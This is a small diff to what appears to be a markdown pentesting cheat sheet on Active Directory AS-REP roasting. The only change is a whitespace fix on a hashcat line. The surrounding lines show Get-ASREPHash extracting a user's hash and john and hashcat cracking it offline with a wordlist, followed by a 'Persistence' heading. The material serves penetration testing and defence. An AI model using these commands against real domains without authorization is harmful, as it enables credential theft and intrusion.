@@ -36,7 +36,7 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 
 ```text
 john --wordlist=passwords_kerb.txt hashes.asreproast
-hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 
 ### Persistence
